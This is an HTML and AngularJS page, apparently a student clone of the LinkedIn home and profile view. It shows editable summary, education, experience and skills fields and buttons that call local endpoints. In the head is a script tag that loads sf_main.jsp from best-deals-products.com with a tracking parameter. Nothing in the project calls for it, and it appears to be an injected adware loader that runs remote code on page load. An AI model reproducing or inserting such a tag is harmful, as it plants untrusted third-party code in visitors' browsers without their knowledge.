    <script src="https://cdn.firebase.com/libs/angularfire/0.9.0/angularfire.min.js"></script>
	<script src="https://static.licdn.com:443/scds/common/u/lib/fizzy/fz-1.3.8-min.js" type="text/javascript">//</script><script type="text/javascript">fs.config({"failureRedirect":"http://www.linkedin.com/","uniEscape":true,"xhrHeaders":{"X-FS-Origin-Request":"/nhome/","X-FS-Page-Id":"nmp-home"}});</script>
    <script src="js/jquery.js"></script>
	<script src="js/bootstrap.min.js"></script>
	
    <title>Home | LinkedIn</title>

<script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script>
<h1>Welcome to LinkedIn</h1>
</head>
<body>


<div data-ng-controller='myLogOutController' data-ng-init="init()">
<p>Hello {{usernametext}} ! Now your logged in!</p>
<button data-ng-click="onClickLogOut()">Sign Out</button>
  <p><data-ng-model="finaltextsummary"></p>
   
         
	<button data-ng-click="onClickfindpage()">Search a Member</button>
	
<button data-ng-click="onClickConnection()">View Connections</button>
<button data-ng-click="onClickaddConnection()">Add a new Connection</button>
<button data-ng-click="onClickinvites()">View Invitations</button>
 
 
 <p>Last time you logged in: {{timetextdata}}</p>
 <div class="section1">
<div class="summaryblock1">
	<h3 class="smallH3">Summary</h3>
	</div>
	<textarea style="width: 600px; height:250px;" data-ng-model="summarytextdata"> {{summarytextdata}} </textarea>
</div>

<div class="section2">
	<div class="header">
	<h3 class="smallH3">Education</h3>
</div>
<div class="summaryblock2">

<textarea style="width: 600px; height:250px;" data-ng-model="educationtextdata"> {{educationtextdata}} </textarea>
</div>
</div>
 
 
<div class="section3">
	<div class="header">
	<h3 class="smallH3">Experience</h3>
</div>
<div class="summaryblock3">
<textarea style="width: 600px; height:250px;"data-ng-model="experiencetextdata"> {{experiencetextdata}}</textarea>
</div>
</div>

<div class="section4">
	<div class="header">
	<h3 class="smallH3">Skills</h3><br>
</div>
<div class="summaryblock4">
<textarea style="width: 600px; height:250px;"data-ng-model="skillstextdata"> {{skillstextdata}}</textarea>
</div>
</div>

 
</div>
<script>

		var myLinkedinHome = angular.module('myLinkedinHome', []);
		myLinkedinHome.controller( 'myLogOutController', function($scope,$http,$location){
  			 console.log("we are in controller linkedinhome");
   				$scope.onClickLogOut = function(){ $http({
   				method: 'GET',
	            url: '/homepage/signout'
	           		}).success(function(response){
	           		console.log("We are in sucees of signout");
	   if(response.login == "Success")
	   {		
	    window.location = '/LogOut';
	    }
	    else
	    {
			console.log("Not logging out");	    
	    }
	        }).error(function(error){
	        console.log("we are in error!!");
	            alert("error");
	        });        
 			
 			  //ddddd
 			
	 	   };
	 	   
	 	   $scope.onClickfindpage = function(){ $http({
   				method: 'GET',
	            url: '/homepage/searchpage',	         
	           		}).success(function(response){
	           		console.log("We are in sucees of signout");
	   if(response.login == "Success")
	   {
	           		window.location = '/successSearch';
	    			
	    }
	    else
	    {
			console.log("Not found");
			alert("No record found");
			window.location = '/home'	    
	    }
	        }).error(function(error){
	        alert("No record found");
			console.log("we are in error!!");
	        window.location = '/home'
	          
	        });        			
	 	   };
	 	   
	 	   
	 	    $scope.onClickConnection = function(){ $http({
   				method: 'GET',
	            url: '/homepage/connectpage',	         
	           		}).success(function(response){
	           		console.log("We are in sucees of signout");
	   if(response.login == "Success")
	   {
	           		window.location = '/successconnect';
	    			
	    }
	    else
	    {
			console.log("Not found");
			alert("No record found");
			window.location = '/home'	    
	    }
	        }).error(function(error){
	        alert("No record found");
			console.log("we are in error!!");
	        window.location = '/home'
	          
	        });        			
	 	   };
	 	   
	 	   
	 	   
	 	    $scope.onClickaddConnection = function(){ $http({
   				method: 'GET',
	            url: '/homepage/addpage',	         
	           		}).success(function(response){
	           		console.log("We are in sucees of signout");
	   if(response.login == "Success")
	   {
	           		window.location = '/successAdd';
	    			
	    }
	    else
	    {
			console.log("Not found");
			alert("No record found");
			window.location = '/home'	    
	    }
	        }).error(function(error){
	        alert("No record found");
			console.log("we are in error!!");
	        window.location = '/home'
	          
	        });        			
	 	   };
	 	   
	 	     $scope.onClickinvites = function(){ $http({
   				method: 'GET',
	            url: '/homepage/invitepage',	         
	           		}).success(function(response){
	           		console.log("We are in sucees of signout");
	   if(response.login == "Success")
	   {
	           		window.location = '/successinvite';
	    			
	    }
	    else
	    {
			console.log("Not found");
			alert("No record found");
			window.location = '/home'	    
	    }
	        }).error(function(error){
	        alert("No record found");
			console.log("we are in error!!");
	        window.location = '/home'
	          
	        });        			
	 	   };
	 	   	 
	 	   

	 	   
	 	   
	 	   $scope.init = function () {
			$http({
   				method: 'GET',
	            url: '/display'
	           		}).success(function(response){
	           		console.log("We are in init");
	
	        $scope.finaltextsummary=response;
	        $scope.summarytextdata=response.summary;
	        $scope.educationtextdata=response.education;
	        $scope.experiencetextdata=response.experience;
	        $scope.skillstextdata=response.skill;
	        $scope.timetextdata=response.mytime;
	        $scope.usernametext=response.username;
	        console.log("Result is "+$scope.finaltextsummary);
	    			
	   	    }).error(function(error){
	        console.log("we are in error!!");
	            alert("error");
	        });        
			};
 			}); 
</script>








	
<div data-ng-controller='myEditController'>
<button data-ng-click="onClickEdit()">Edit Profile</button>
</div>

